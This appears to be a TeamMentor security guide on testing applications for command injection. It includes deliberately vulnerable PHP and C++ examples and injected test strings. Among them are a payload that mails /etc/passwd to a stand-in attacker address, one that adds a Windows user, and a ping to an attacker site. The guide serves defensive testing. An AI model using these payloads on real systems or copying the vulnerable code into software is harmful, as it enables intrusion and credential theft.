<?xml version="1.0"?>
<TeamMentor_Article Metadata_Hash="-1856655336" Content_Hash="-159156809">
  <Metadata>
    <Id>820d595d-b22c-4e7e-b8c2-104eb854d929</Id>
    <Library_Id>00000000-0000-0000-0000-000000000000</Library_Id>
    <Title>How to Test for Command Injection Bugs</Title>
    <Category>Input and Data Validation</Category>
    <Phase>Test</Phase>
    <Technology> Any</Technology>
    <Type>How To</Type>
    <DirectLink />
    <Tag />
    <Security_Demand />
    <Author>Andres De Vivanco</Author>
    <Priority />
    <Status />
  </Metadata>
  <Content Sanitized="true" DataType="Html">
    <Data><![CDATA[<br><h1>Applies to:</h1><ul><li>Programming languages that allow interaction with operating system commands such as C/C++, Java, VB, PHP, Perl, and Python.</li></ul><p>&nbsp;</p><h1>Summary</h1><p>Command injection vulnerabilities are particularly dangerous as they allow unauthorized execution of operating system commands.&nbsp; They exist because applications fail to properly validate and sanitize the parameters they use when invoking shell functions such as system() or exec() to execute system commands.&nbsp;&nbsp; Attackers with control of these parameters can trick the application into executing any system command of their choice.&nbsp; </p><p>For example, a UNIX application lists the contents of a folder using the ls command.&nbsp; It takes the string <em>folder_name</em> from the user and, without any validation, concatenates it to "ls" to build the actual command.&nbsp; The application then passes the command ("ls <em>folder_name</em>") to the system() function and grabs the results.&nbsp; A command injection bug allows an attacker to inject an additional command in the input string<em> folder_name</em>.&nbsp; As a result the application is tricked into executing the attacker’s additional command.</p><p>In order to properly test for command injection vulnerabilities, the following steps should be followed:</p><ul><li>Step 1:&nbsp; Understand Attack Scenarios </li><li>Step 2:&nbsp; Analyze Causes and Countermeasures </li><li>Step 3:&nbsp; Start Testing and Exploring </li><li>Step 4:&nbsp; Fine-tune Test Cases</li></ul><p>&nbsp;</p><h1>Step 1:&nbsp; Understand Attack Scenarios</h1><p>The first step in testing for command injection vulnerabilities is to understand their attack scenarios.&nbsp; There are two common types on command injection bugs:</p><ul><li>Direct command injection. </li><li>Indirect command injection.</li></ul><p><strong><em>&nbsp;</em></strong></p><h2><em>Scenario 1:&nbsp; Direct Command injection</em></h2><p>The most basic form of command injection consists of directly supplying the additional command to the vulnerable application.&nbsp;&nbsp; First the attacker discovers that the application invokes a system command by directly passing user supplied data as arguments to the command.&nbsp;&nbsp;&nbsp; Then the attacker supplies the malicious command as part of the expected arguments.&nbsp; The application executes the original command and then the malicious one. </p><p>In detail:</p><ol><li>Attacker discovers that application uses client input to execute a command. </li><li>Attacker supplies malicious command as part of the client input. </li><li>Attacker observes application executing additional command.</li></ol><p>&nbsp;</p><h2><em>Scenario 2:&nbsp; Indirect Command injection</em></h2><p>This case of command injection consists of indirectly supplying the additional command to the vulnerable application possibly through a file or an environment variable.&nbsp;&nbsp;&nbsp;&nbsp; First the attacker deducts that the application invokes a system command using data from an external source such as a file or an environment variable.&nbsp; The attacker then modifies the contents of the external source to add a malicious command.&nbsp;&nbsp; Then the attacker waits or forces the application to execute the malicious command along with the original one.</p><p>In detail:</p><ol><li>Attacker discovers that application uses data stored in an external source to execute a command. </li><li>Attacker edits the external source to include malicious command. </li><li>Attacker waits until the application executes the original command (or attacker attempts to bring the application to a state in which it will execute the command supplied). </li><li>Attacker verifies that the application executes the injected command.</li></ol><p><strong></strong>&nbsp;</p><h1>Step 2:&nbsp; Analyze Causes and Countermeasures</h1><p>During this step you will understand the cause of command injection bugs as well as common defenses.&nbsp;&nbsp;&nbsp;&nbsp; This will help you look for bugs in code and recognize safe coding practices.</p><p>&nbsp;</p><h2><em>Command Injection Causes</em></h2><p>There is one single cause for command injection bugs: poor input validation.&nbsp; Any application that builds command strings using non-sanitized data is vulnerable to this bug. .&nbsp; The following code snippets demonstrate command injection vulnerabilities. This PHP code running in Windows uses the input supplied by a text box in a form and invokes the exec function to type the file: </p><pre>&lt;?php<br>&nbsp;<br>&nbsp; $command = 'type ' . $_POST['username'];<br>&nbsp; exec($command, $res);&nbsp; <br>&nbsp;<br>&nbsp; for ($i = 0; $i &lt; sizeof($res); $i++) <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo $res[$i].'&lt;br&gt;';<br>&nbsp;<br>?&gt;&nbsp;</pre><p>A user can supply the following string to see the list of active connections in the server:</p>
<pre>file.txt|netstat -ano</pre><br><p>The following example in C++ (courtesy of OWASP [i]) runs in a POSIX compliant environment such as a Unix variant.&nbsp; It uses input supplied by the command line to system and runs the cat command:</p>
<pre>#include &lt;stdio.h&gt;<br>#include &lt;unistd.h&gt;<br>&nbsp;<br>int main(int argc, char **argv) {<br>&nbsp;<br>&nbsp;char cat[] = "cat ";<br>&nbsp;char *command;<br>&nbsp;size_t commandLength;<br>&nbsp;<br>&nbsp;commandLength = strlen(cat) + strlen(argv[1]) + 1;<br>&nbsp;command = (char *) malloc(commandLength);<br>&nbsp;strncpy(command, cat, commandLength);<br>&nbsp;strncat(command, argv[1], (commandLength - strlen(cat)) );<br>&nbsp;<br>&nbsp;system(command);<br>&nbsp;return (0);<br>&nbsp;<br>}</pre><p>A user can supply the following string to list the contents of the see the contents of the server’s current directory:</p><pre><strong>file.txt;ls</strong></pre><p>The code snippets above use two different functions that interact with the shell named exec() and system().&nbsp; The following list compiles popular functions attacked during command injection:&nbsp;</p><table><tbody><tr><td><pre><strong>Function</strong></pre></td><td><pre><strong>Language</strong></pre></td></tr><tr><td><pre>system, execlp,execvp, ShellExecute, _wsystem</pre></td><td><pre>C/C++</pre></td></tr><tr><td><pre>Runtime.exec</pre></td><td><pre>Java</pre></td></tr><tr><td><pre>exec, eval</pre></td><td><pre>PHP</pre></td></tr><tr><td><pre>exec, open, eval, </pre></td><td><pre>Perl</pre></td></tr><tr><td><pre>exec, eval, execfile, input</pre></td><td><pre>Python</pre></td></tr><tr><td><pre>Shell, ShellExecuteForExplore, ShellExecute</pre></td><td><pre>VB</pre></td></tr></tbody></table><pre>&nbsp;</pre><h2><em>Command Injection Countermeasures</em></h2><p>Applications defend against command injection bugs by doing proper input validation and sanitization.&nbsp;&nbsp; Developers must look for all instances where the application invokes a shell-like system function such as exec or system and avoid executing them unless the parameters have been properly validated and sanitized.&nbsp;&nbsp; There are two possible ways to validate these parameters: using black lists or using white lists.&nbsp; </p><p>Black lists check for malicious patterns before allowing execution.&nbsp; In case of command injection, a black list might contain command delimiters such as a semicolon (;)vertical dash (|), double dash (||), double amp (&amp;&amp;) as well as dangerous commands such as rm, cp, cat, ls, at, net, netstat, del, copy, etc.&nbsp; However, a major drawback impedes this countermeasure from being effective; unless the black list covers absolutely all dangerous possibilities, the adversary can find a variation outside of the black list to carry an attack.&nbsp; &nbsp;&nbsp;</p><p>White lists match against safe execution patterns.&nbsp; If the data in question doesn’t match any of the safe patterns it is disallowed.&nbsp; This solves the problem of new variations of dangerous constructs since any new (malicious) construct that doesn’t match a safe one is automatically blocked.&nbsp; A common way to implement white lists is to match the input against a regular expression that indicates the safe format for the command.&nbsp; However, regular expressions can be complex to write and interpret.&nbsp; Developers must make sure they understand well how to write and interpret regular expressions before implementing this defense.</p><p>&nbsp;</p><h1>Step 3:&nbsp; Start Testing and Exploring</h1><p>During this step you will start testing your application with basic command injection strings and observing how the application reacts.</p><h2><em>Start with a simple test string</em></h2><p>First, you need to find all the places where your application invokes a system command to perform and operation.&nbsp; Then on each of these places, start exploring how the application handles the basic characters needed for command injection.&nbsp;&nbsp;&nbsp; The following two strings are good to try as they contain both commands and command injection characters: </p><pre>abc;dir C:|xyz&amp;netstat&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (Windows)</pre><pre>abc;ls|cp&amp;rm&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (UNIX)</pre><p>If the application doesn’t give an error message because of the special characters then there is a chance that it suffers from a command injection bug.</p><p>&nbsp;</p><h2><em>Build a valid command</em></h2><p>It is important that you are able to comprehend.&nbsp; For example, a <em>file not found</em> error rather than an <em>invalid data format</em> error is a good hint that the application is processing the special characters as part of the file.&nbsp; For example, you might get a file not found error when using the following string:</p><pre><strong>file.txt|dir c:</strong></pre><p>This is because the application is calling exec() with the following string:</p><pre>cmd /c type "c:\public_html\user_files\<strong>file.txt|dir c:</strong>" </pre><p>For the input string to execute the directory listing command you need to close the double quotes before appending the extra command:</p><pre>file.txt<strong>"</strong>|dir c:</pre><p>Pay extra attention to quotes and double quotes since omitting them can easily result in the injection string treated as data. </p><p>Sometimes the application doesn’t reflect the output of the injected command on screen. To get around this, use a command that doesn’t create screen output but that performs a visible action:</p><table><tbody><tr><td><pre>file.txt;mail attacker@attacker.org &lt;/etc/passwd</pre><pre>&nbsp;</pre></td><td><pre>Emails attacker the server’s passwords.</pre></td></tr><tr><td><pre>file.txt|net user /add "hacker"</pre><pre>&nbsp;</pre></td><td><pre>Adds hacker to the Windows user database.</pre></td></tr><tr><td><pre>file.txt;ping%20attacker_site</pre></td><td><pre>Pings the attacker site.</pre></td></tr></tbody></table><pre>&nbsp;&nbsp;</pre><h1>Step 4:&nbsp; Fine-tune Test Case Data</h1><p>To thoroughly test your application against command injection bugs, you must cover all possible entry points and scenarios where command injection is possible.</p><h2><em>Try different entry points and scenarios</em></h2><p>Continue exploring the different entry points of the application.&nbsp; The format of the test case data will vary depending on the entry point.&nbsp; For example if you are testing through the URL the string file.txt"|dir c: might look like one of the two below (depending on the URL encoding):</p><ul><li><pre>file.txt"|dir%20c: </pre></li><li><pre>file.txt"|dir+c:&nbsp;</pre></li></ul><p>It is important that you consider different encodings and data format for additional command injection entry points such as: input fields, URL parameters, POST data, web service methods, user interface elements, environment variables, database contents, registry contents, file contents, third party APIs, and network packets.</p><p>When testing for indirect command injection it is important that you control the source of the parameters passed to the target function. &nbsp;&nbsp;For example, if you are attacking an application using execfile as the target functionthen you must control the file passed to this function.&nbsp; Let’s say the application uses execfile /private/commands.txt. Here you don’t need to pass any malicious parameters; you must modify the commands file to inject malicious commands and wait for (or force) the injected command to execute. It is recommended that, when testing for indirect injection, you use an environment monitoring tool.&nbsp;&nbsp; You can use Sysinternals <em>Process Explorer</em> that now combines registry, file system, and environment variable monitoring to find out the external sources your application uses when invoking shell or system commands.</p><p>&nbsp;</p><h1>Conclusions</h1><p>Command injection bugs exist because of poor input validation and sanitization on the parameters used by functions that interact with the operating system shell.&nbsp;&nbsp; Any attacker with control of these parameters can force the application to execute unwanted system commands.&nbsp; Testing against command injection bugs consists of manipulating the original command parameters with different combinations of command injection strings that vary depending on the action to perform and the entry point under test.</p><p>&nbsp;</p><p><br>&nbsp;</p><br><hr><br><p>[i] <strong>Command Injection</strong>. OWASP. <a href="http://www.owasp.org/index.php/Command_Injection">http://www.owasp.org/index.php/Command_Injection</a></p><p>&nbsp;</p>]]></Data>
  </Content>
</TeamMentor_Article>